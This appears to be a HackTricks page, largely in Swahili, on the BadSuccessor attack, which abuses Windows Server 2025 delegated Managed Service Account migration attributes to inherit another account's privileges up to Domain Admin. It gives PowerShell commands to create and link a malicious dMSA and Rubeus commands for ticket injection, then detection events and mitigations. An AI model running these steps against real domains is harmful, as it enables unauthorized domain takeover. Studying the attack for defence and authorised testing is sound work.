# BadSuccessor: Privilege Escalation via Delegated MSA Migration Abuse

{{#include ../../banners/hacktricks-training.md}}

## Overview

Delegated Managed Service Accounts (**dMSA**) ni kizazi kipya cha **gMSA** ambacho kinakuja na Windows Server 2025. Mchakato halali wa uhamishaji unaruhusu wasimamizi kubadilisha akaunti *ya zamani* (mtumiaji, kompyuta au akaunti ya huduma) na dMSA huku wakihifadhi ruhusa kwa uwazi. Mchakato huu unapatikana kupitia PowerShell cmdlets kama `Start-ADServiceAccountMigration` na `Complete-ADServiceAccountMigration` na unategemea sifa mbili za LDAP za **dMSA object**:

* **`msDS-ManagedAccountPrecededByLink`** – *DN link* kwa akaunti iliyotangulia (ya zamani).
* **`msDS-DelegatedMSAState`**       – hali ya uhamishaji (`0` = hakuna, `1` = inaendelea, `2` = *imekamilika*).

Ikiwa mshambuliaji anaweza kuunda **yoyote** dMSA ndani ya OU na moja kwa moja kubadilisha hizo sifa 2, LSASS & KDC vitachukulia dMSA kama *mfuasi* wa akaunti iliyounganishwa. Wakati mshambuliaji anapojitambulisha kama dMSA **wanarithi ruhusa zote za akaunti iliyounganishwa** – hadi **Domain Admin** ikiwa akaunti ya Msimamizi imeunganishwa.

Tekniki hii ilitolewa jina **BadSuccessor** na Unit 42 mnamo 2025. Wakati wa kuandika **hakuna patch ya usalama** inapatikana; tu kuimarisha ruhusa za OU kunapunguza tatizo.

### Attack prerequisites

1. Akaunti ambayo *inaruhusiwa* kuunda vitu ndani ya **Organizational Unit (OU)** *na* ina angalau moja ya:
* `Create Child` → **`msDS-DelegatedManagedServiceAccount`** darasa la kitu
* `Create Child` → **`All Objects`** (kuunda kwa jumla)
2. Muunganisho wa mtandao kwa LDAP & Kerberos (hali ya kawaida ya kujiunga na domain / shambulio la mbali).

## Enumerating Vulnerable OUs

Unit 42 ilitoa skripti ya msaada ya PowerShell inayochambua waelekezi wa usalama wa kila OU na kuonyesha ACEs zinazohitajika:
```powershell
Get-BadSuccessorOUPermissions.ps1 -Domain contoso.local
```
Chini ya uso, skripti inafanya utafutaji wa LDAP ulio na kurasa kwa `(objectClass=organizationalUnit)` na inakagua kila `nTSecurityDescriptor` kwa

* `ADS_RIGHT_DS_CREATE_CHILD` (0x0001)
* `Active Directory Schema ID: 31ed51fa-77b1-4175-884a-5c6f3f6f34e8` (darasa la kitu *msDS-DelegatedManagedServiceAccount*)

## Hatua za Ukatili

Mara tu OU inayoweza kuandikwa inapobainishwa, shambulio liko umbali wa maandiko 3 ya LDAP:
```powershell
# 1. Create a new delegated MSA inside the delegated OU
New-ADServiceAccount -Name attacker_dMSA \
-DNSHostName host.contoso.local \
-Path "OU=DelegatedOU,DC=contoso,DC=com"

# 2. Point the dMSA to the target account (e.g. Domain Admin)
Set-ADServiceAccount attacker_dMSA -Add \
@{msDS-ManagedAccountPrecededByLink="CN=Administrator,CN=Users,DC=contoso,DC=com"}

# 3. Mark the migration as *completed*
Set-ADServiceAccount attacker_dMSA -Replace @{msDS-DelegatedMSAState=2}
```
Baada ya kuiga, mshambuliaji anaweza tu **kuingia** kama `attacker_dMSA$` au kuomba TGT ya Kerberos – Windows itaunda token ya akaunti *iliyopitwa na wakati*.

### Utaftaji

PoCs kadhaa za umma zinajumuisha mchakato mzima ikiwa ni pamoja na urejeleaji wa nenosiri na usimamizi wa tiketi:

* SharpSuccessor (C#) – [https://github.com/logangoins/SharpSuccessor](https://github.com/logangoins/SharpSuccessor)
* BadSuccessor.ps1 (PowerShell) – [https://github.com/LuemmelSec/Pentest-Tools-Collection/blob/main/tools/ActiveDirectory/BadSuccessor.ps1](https://github.com/LuemmelSec/Pentest-Tools-Collection/blob/main/tools/ActiveDirectory/BadSuccessor.ps1)
* Moduli ya NetExec – `badsuccessor` (Python) – [https://github.com/Pennyw0rth/NetExec](https://github.com/Pennyw0rth/NetExec)

### Baada ya Utekelezaji
```powershell
# Request a TGT for the dMSA and inject it (Rubeus)
Rubeus asktgt /user:attacker_dMSA$ /password:<ClearTextPwd> /domain:contoso.local
Rubeus ptt /ticket:<Base64TGT>

# Access Domain Admin resources
dir \\DC01\C$
```
## Detection & Hunting

Enable **Object Auditing** on OUs and monitor for the following Windows Security Events:

* **5137** – Creation of the **dMSA** object
* **5136** – Modification of **`msDS-ManagedAccountPrecededByLink`**
* **4662** – Specific attribute changes
* GUID `2f5c138a-bd38-4016-88b4-0ec87cbb4919` → `msDS-DelegatedMSAState`
* GUID `a0945b2b-57a2-43bd-b327-4d112a4e8bd1` → `msDS-ManagedAccountPrecededByLink`
* **2946** – TGT issuance for the dMSA

Correlating `4662` (attribute modification), `4741` (creation of a computer/service account) and `4624` (subsequent logon) quickly highlights BadSuccessor activity.  XDR solutions such as **XSIAM** ship with ready-to-use queries (see references).

## Mitigation

* Apply the principle of **least privilege** – only delegate *Service Account* management to trusted roles.
* Remove `Create Child` / `msDS-DelegatedManagedServiceAccount` from OUs that do not explicitly require it.
* Monitor for the event IDs listed above and alert on *non-Tier-0* identities creating or editing dMSAs.

## See also


{{#ref}}
golden-dmsa-gmsa.md
{{#endref}}

## References

- [Unit42 – When Good Accounts Go Bad: Exploiting Delegated Managed Service Accounts](https://unit42.paloaltonetworks.com/badsuccessor-attack-vector/)
- [SharpSuccessor PoC](https://github.com/logangoins/SharpSuccessor)
- [BadSuccessor.ps1 – Pentest-Tools-Collection](https://github.com/LuemmelSec/Pentest-Tools-Collection/blob/main/tools/ActiveDirectory/BadSuccessor.ps1)
- [NetExec BadSuccessor module](https://github.com/Pennyw0rth/NetExec/blob/main/nxc/modules/badsuccessor.py)

{{#include ../../banners/hacktricks-training.md}}
